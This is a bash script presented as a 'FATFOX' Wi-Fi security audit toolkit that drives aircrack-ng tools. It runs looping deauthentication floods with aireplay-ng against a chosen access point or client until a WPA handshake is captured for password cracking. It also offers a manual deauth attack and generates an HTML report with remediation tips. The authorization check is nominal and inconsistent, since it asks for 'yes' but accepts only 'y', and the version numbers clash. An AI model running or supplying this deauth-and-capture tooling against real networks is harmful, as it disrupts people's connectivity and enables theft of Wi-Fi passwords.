#!/bin/bash
# ======================================
#        FATFOX SECURITY TOOLKIT v1.8.0
#      Authorized WiFi Audit Only
# ======================================

# CONFIGURATION
CAPTURE_DIR="$PWD/captures"
DEAUTH_DIR="$PWD/deauth"
REPORT_DIR="$PWD/reports"
mkdir -p "$CAPTURE_DIR" "$DEAUTH_DIR" "$REPORT_DIR"

# COLORS
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Global variables for session tracking
declare -A SESSION_DATA

# HEADER
clear
echo -e "${GREEN}======================================"
echo -e "      FATFOX SECURITY TOOLKIT v1.6.0"
echo -e "      Authorized WiFi Audit Only"
echo -e "======================================${NC}"
read -p "Confirm written authorization? (yes/no): " AUTH
if [[ "$AUTH" != "y" ]]; then
    echo -e "${RED}Authorization not confirmed. Exiting.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Authorization confirmed.${NC}"

# CHECK MONITOR MODE INTERFACE
echo -e "${YELLOW}[*] Detecting monitor mode interfaces...${NC}"
MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -n1)
if [[ -z "$MON_IFACE" ]]; then
    echo -e "${RED}[✘] No monitor interface detected.${NC}"
    echo -e "${YELLOW}[!] Start monitor mode first: sudo airmon-ng start wlan0${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Monitor interface detected: $MON_IFACE${NC}"

# Function to analyze capture file
analyze_capture() {
    local cap_file="$1"
    local ssid="$2"
    local bssid="$3"
    local channel="$4"
    
    # Client count
    local client_count=$(airodump-ng --read "$cap_file" 2>/dev/null | \
        grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}" | awk '{print $1}' | sort -u | wc -l)
    client_count=${client_count:-0}
    
    # Packet count
    local packet_count=$(tshark -r "$cap_file" 2>/dev/null | wc -l)
    packet_count=${packet_count:-$(aircrack-ng "$cap_file" 2>/dev/null | grep "packets" | awk '{print $2}')}
    packet_count=${packet_count:-"N/A"}
    
    # Handshake detection
    local handshake_count=$(aircrack-ng "$cap_file" 2>/dev/null | grep -c "handshake")
    local handshake_status="NOT DETECTED"
    [[ "$handshake_count" -gt 0 ]] && handshake_status="DETECTED"
    
    SESSION_DATA["clients"]=$client_count
    SESSION_DATA["packets"]=$packet_count
    SESSION_DATA["handshakes"]=$handshake_count
    SESSION_DATA["handshake_status"]=$handshake_status
    SESSION_DATA["ssid"]="$ssid"
    SESSION_DATA["bssid"]="$bssid"
    SESSION_DATA["channel"]="$channel"
}

# Function to generate professional report
generate_professional_report() {
    local report_file="$1"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    
    # Deauth logs summary
    local deauth_logs=$(find "$DEAUTH_DIR" -name "*.log" -mtime -7 2>/dev/null | wc -l)
    local deauth_files=$(find "$DEAUTH_DIR" -name "*.log" -mtime -7 2>/dev/null | xargs -I {} basename {} || echo "None")
    
    cat << EOF > "$report_file"
<!DOCTYPE html>
<html>
<head>
    <title>FATFOX WiFi Security Audit Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; color: #333; }
        .header { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 30px; border-radius: 10px; text-align: center; }
        .summary-box { background: #f8f9fa; border: 2px solid #dee2e6; border-radius: 10px; padding: 20px; margin: 20px 0; }
        .status-good { background: #d4edda; color: #155724; padding: 10px; border-radius: 5px; border-left: 5px solid #28a745; }
        .status-bad { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; border-left: 5px solid #dc3545; }
        .risk-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        .risk-table th, .risk-table td { border: 1px solid #ddd; padding: 12px; text-align: left; }
        .risk-table th { background: #1e3c72; color: white; }
        .critical { background: #f8d7da; font-weight: bold; }
        .files-section { background: #e9ecef; padding: 15px; border-radius: 5px; }
        h1, h2 { color: #1e3c72; }
        .timestamp { color: #666; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 FATFOX WiFi Security Audit Report</h1>
        <p class="timestamp">Generated: $timestamp</p>
    </div>

    <div class="summary-box">
        <h2>📡 Network Summary</h2>
        <table style="width:100%; margin:20px 0;">
            <tr><td><strong>SSID:</strong></td><td>${SESSION_DATA["ssid"]}</td></tr>
            <tr><td><strong>BSSID:</strong></td><td>${SESSION_DATA["bssid"]}</td></tr>
            <tr><td><strong>Channel:</strong></td><td>${SESSION_DATA["channel"]}</td></tr>
            <tr><td><strong>Clients Observed:</strong></td><td>${SESSION_DATA["clients"]}</td></tr>
            <tr><td><strong>Packets Captured:</strong></td><td>${SESSION_DATA["packets"]}</td></tr>
        </table>
    </div>

    <div class="summary-box">
        <h2>🔑 Handshake Status</h2>
EOF

    if [[ "${SESSION_DATA["handshake_status"]}" == "DETECTED" ]]; then
        cat << EOF >> "$report_file"
        <div class="status-good">
            ✅ <strong>SUCCESS:</strong> ${SESSION_DATA["handshakes"]} valid WPA handshake(s) captured
        </div>
EOF
    else
        cat << EOF >> "$report_file"
        <div class="status-bad">
            ❌ <strong>FAILED:</strong> No valid WPA handshakes captured
        </div>
EOF
    fi

    cat << EOF >> "$report_file"
    </div>

    <div class="summary-box">
        <h2>⚡ Deauthentication Activity</h2>
        <p><strong>$deauth_logs</strong> deauth session log(s) generated in last 7 days</p>
        <div class="files-section">
            <strong>Recent logs:</strong><br>
            <code>$deauth_files</code>
        </div>
    </div>

    <div class="summary-box">
        <h2>🎯 Security Assessment</h2>
        <table class="risk-table">
            <tr><th>Issue</th><th>Risk Level</th><th>Status</th><th>Impact</th></tr>
            <tr><td>WPA Handshake Capture</td><td class="critical">HIGH</td><td>${SESSION_DATA["handshake_status"]}</td><td>Password cracking possible</td></tr>
            <tr><td>Deauth Protection</td><td>HIGH</td><td>Vulnerable</td><td>DoS attacks possible</td></tr>
            <tr><td>Client Deauth Response</td><td>MEDIUM</td><td>${SESSION_DATA["clients"]} clients affected</td><td>Service disruption</td></tr>
        </table>
    </div>

    <div class="summary-box">
        <h2>🛡️ Remediation Recommendations</h2>
        <ol>
            <li><strong>Enable 802.11w (Management Frame Protection)</strong> - Prevents deauth attacks</li>
            <li><strong>Upgrade to WPA3</strong> - Stronger handshake protection</li>
            <li><strong>Enable PMF (Protected Management Frames)</strong> on all clients</li>
            <li><strong>Monitor for deauth floods</strong> using IDS/IPS</li>
            <li><strong>Strong, unique passphrase</strong> (>20 chars, mixed case/symbols)</li>
        </ol>
    </div>

    <div style="margin-top: 40px; padding: 20px; background: #f8f9fa; border-radius: 10px;">
        <p><em>This assessment was conducted by authorized security professionals using FATFOX Security Toolkit v1.6.0</em></p>
        <p><strong>Audit Files Location:</strong> <code>$PWD</code></p>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}[+] Professional HTML report generated: $report_file${NC}"
    echo -e "${CYAN}[+] Open with: xdg-open \"$report_file\"${NC}"
}

# MAIN MENU
while true; do
    echo ""
    echo "--------- MAIN MENU ---------"
    echo "1) Pre-Scan Reminder Mode"
    echo "2) Start New Audit Session (Basic)"
    echo "3) Auto Handshake Capture + Deauth ★"
    echo "4) Manual Deauth Attack"
    echo "5) Verify Handshake File"
    echo "6) Generate Professional Audit Report"
    echo "7) Quick Session Report (Last Capture)"
    echo "8) Clean Old Captures"
    echo "9) Exit"
    echo "-----------------------------"
    read -p "Select option: " OPTION

    case $OPTION in
        1)
            echo -e "${YELLOW}[*] Pre-Scan Reminder Mode${NC}"
            echo "✅ Monitor interface: $MON_IFACE"
            echo "✅ Legal authorization confirmed"
            echo "✅ Clients active on target network"
            ;;
        2|3)
            read -p "Enter target SSID: " SSID
            read -p "Enter BSSID: " BSSID
            read -p "Enter channel: " CHANNEL
            
            if [[ $OPTION == "3" ]]; then
                read -p "Deauth interval (seconds, default 10): " DEAUTH_INTERVAL
                DEAUTH_INTERVAL=${DEAUTH_INTERVAL:-10}
                read -p "Max deauth packets per burst (default 50): " DEAUTH_PACKETS
                DEAUTH_PACKETS=${DEAUTH_PACKETS:-50}
            fi

            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
            CAP_FILE="$CAPTURE_DIR/${SSID// /_}_${TIMESTAMP}.cap"
            DEAUTH_LOG="$DEAUTH_DIR/${SSID// /_}_deauth_${TIMESTAMP}.log"

            echo -e "${GREEN}🚀 Starting capture: $CAP_FILE${NC}"
            
            if [[ $OPTION == "2" ]]; then
                # Basic capture
                SESSION_START=$(date +%s)
                sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE"
                SESSION_END=$(date +%s)
            else
                # Auto handshake + deauth
                sudo airodump-ng --bssid "$BSSID" --channel "$CHANNEL" -w "$CAP_FILE" "$MON_IFACE" &
                AIRODUMP_PID=$!
                
                while true; do
                    echo "$(date): Deauth burst #$DEAUTH_PACKETS to $BSSID" >> "$DEAUTH_LOG"
                    sudo aireplay-ng -0 "$DEAUTH_PACKETS" -a "$BSSID" "$MON_IFACE" >> "$DEAUTH_LOG" 2>&1
                    
                    sleep 2
                    HANDSHAKE_CHECK=$(aircrack-ng "$CAP_FILE"-01.cap 2>/dev/null | grep -c "handshake")
                    if [[ "$HANDSHAKE_CHECK" -gt 0 ]]; then
                        echo -e "${GREEN}[+] 🎉 HANDSHAKE CAPTURED!${NC}"
                        kill $AIRODUMP_PID 2>/dev/null
                        break
                    fi
                    
                    sleep $((DEAUTH_INTERVAL - 2))
                done
            fi

            # Auto-analyze session
            analyze_capture "$CAP_FILE-01.cap" "$SSID" "$BSSID" "$CHANNEL"
            echo -e "${GREEN}[+] Session analyzed and ready for reporting${NC}"
            ;;
        4)
            echo -e "${CYAN}[*] Manual Deauth Attack${NC}"
            read -p "Target BSSID: " BSSID
            read -p "Target Client MAC (or ALL): " CLIENT_MAC
            read -p "Deauth packets (default 100): " DEAUTH_PACKETS
            DEAUTH_PACKETS=${DEAUTH_PACKETS:-100}
            
            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
            DEAUTH_LOG="$DEAUTH_DIR/manual_deauth_${TIMESTAMP}.log"
            
            echo -e "${GREEN}[⚡] Launching $DEAUTH_PACKETS deauth packets...${NC}"
            
            if [[ "$CLIENT_MAC" == "ALL" || -z "$CLIENT_MAC" ]]; then
                sudo aireplay-ng -0 "$DEAUTH_PACKETS" -a "$BSSID" "$MON_IFACE" | tee "$DEAUTH_LOG"
            else
                sudo aireplay-ng -0 "$DEAUTH_PACKETS" -a "$BSSID" -c "$CLIENT_MAC" "$MON_IFACE" | tee "$DEAUTH_LOG"
            fi
            ;;
        5)
            echo -e "${YELLOW}[+] Capture files:${NC}"
            ls -laht "$CAPTURE_DIR"/*.cap 2>/dev/null || echo "No captures found"
            read -p "File to verify: " CAP_SELECT
            [[ -f "$CAP_SELECT" ]] && analyze_capture "$CAP_SELECT" "Unknown" "Unknown" "Unknown"
            ;;
        6)
            if [[ -z "${SESSION_DATA["ssid"]}" ]]; then
                echo -e "${YELLOW}[!] No active session data. Run capture first.${NC}"
                continue
            fi
            REPORT_FILE="$REPORT_DIR/FATFOX_Audit_$(date +%Y%m%d_%H%M%S).html"
            generate_professional_report "$REPORT_FILE"
            ;;
        7)
            # Quick report from most recent capture
            LATEST_CAP=$(ls -t "$CAPTURE_DIR"/*.cap 2>/dev/null | head -n1)
            if [[ -n "$LATEST_CAP" ]]; then
                echo -e "${GREEN}[+] Analyzing latest: $LATEST_CAP${NC}"
                analyze_capture "$LATEST_CAP" "Auto" "Auto" "Auto"
                REPORT_FILE="$REPORT_DIR/Quick_Report_$(date +%Y%m%d_%H%M%S).html"
                generate_professional_report "$REPORT_FILE"
            else
                echo -e "${RED}[!] No capture files found${NC}"
            fi
            ;;
        8)
            echo -e "${YELLOW}[+] Cleaning...${NC}"
            find "$CAPTURE_DIR" -name "*.cap" -mtime +1 -delete 2>/dev/null
            find "$DEAUTH_DIR" -name "*.log" -mtime +7 -delete 2>/dev/null
            echo -e "${GREEN}[+] Cleanup complete${NC}"
            ;;
        9)
            echo -e "${GREEN}[+] Exiting FATFOX Toolkit v1.6.0${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            ;;
    esac
done
